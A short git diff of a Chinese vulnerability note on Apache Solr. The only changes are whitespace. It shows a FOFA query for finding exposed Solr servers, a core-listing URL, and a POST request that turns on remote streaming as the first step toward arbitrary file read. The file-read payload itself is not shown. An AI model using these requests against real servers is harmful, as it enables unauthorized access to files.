@@ -3,7 +3,7 @@
 fofa app="Solr" || app="Apache-Solr"
 ## POC
 - url访问：  
-`http://ip:port/solr/admin/cores?indexInfo=false&wt=json`  
+`http://ip:port/solr/admin/cores?indexInfo=false&wt=json`
 ![](img/1.png)  
 - POST请求：
 ```url
@@ -11,7 +11,7 @@ POST /solr/{name}/config
 
 {"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
 ```
-出现这个报错说明漏洞存在  
+出现这个报错说明漏洞存在
 ![](img/1.png)  
 - 任意文件读取：
 ```url
